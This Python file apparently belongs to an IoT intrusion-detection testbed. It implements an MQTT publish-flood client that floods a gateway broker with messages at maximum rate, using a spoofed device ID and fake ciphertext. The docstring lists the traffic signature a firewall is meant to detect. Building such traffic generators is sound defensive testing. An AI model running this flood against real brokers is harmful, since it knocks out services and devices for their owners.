"""
flood_client.py — MQTT publish flood attack.

Sends MQTT messages as fast as possible (or at ATTACK_RATE_HZ) to overwhelm
the gateway broker. Each message is a structurally valid-looking JSON payload
with random ciphertext — it will pass the MQTT layer but fail decryption.

Network signature the firewall should detect:
  - Very high Srate (pkts/sec from attacker → gateway)
  - Near-zero Drate (broker sends few ACKs before being overwhelmed)
  - Low Weight (fwd_pkts >> bwd_pkts → Weight = fwd × bwd ≈ 0)
  - Uniform small packet sizes → low Std

Environment variables:
  ATTACK_RATE_HZ       Messages per second (default: 0 = as fast as possible)
  ATTACK_BURST_COUNT   Stop after this many messages (default: 0 = infinite)
  ATTACK_FLOOD_TARGET  MQTT topic to flood (default: nodes/flood-attacker/data)
  GATEWAY_IP / GATEWAY_PORT
"""

from __future__ import annotations

import base64
import os
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from attack_clients.base_attack_client import BaseAttackClient


class FloodClient(BaseAttackClient):
    """
    Sends structurally valid JSON MQTT messages at maximum rate.

    Each payload mimics a real client-a message but with random nonce +
    ciphertext that will fail AES-GCM decryption at the gateway — still
    generating the desired network flood pattern for IDS/IPS testing.
    """

    ATTACK_NAME     = "mqtt-flood"
    SPOOF_DEVICE_ID = "flood-attacker"

    # Pre-encoded random bytes reused across messages to minimise Python
    # object allocation overhead during the flood (maximises packet rate).
    _FAKE_NONCE      = base64.b64encode(b"\xff" * 12).decode()
    _FAKE_CIPHERTEXT = base64.b64encode(b"\xde\xad\xbe\xef" * 64).decode()

    def __init__(self) -> None:
        target = os.getenv("ATTACK_FLOOD_TARGET")
        super().__init__(target_topic=target)
        self._seq_base = int(time.time() * 1000) & 0xFFFFFF  # avoid obvious seq=1

    def build_payload(self, seq: int) -> dict:
        return {
            "device_id":   self.SPOOF_DEVICE_ID,
            "crypto_type": "aes_gcm",
            "seq":         self._seq_base + seq,
            "nonce":       self._FAKE_NONCE,
            "ciphertext":  self._FAKE_CIPHERTEXT,
        }


if __name__ == "__main__":
    FloodClient().run()
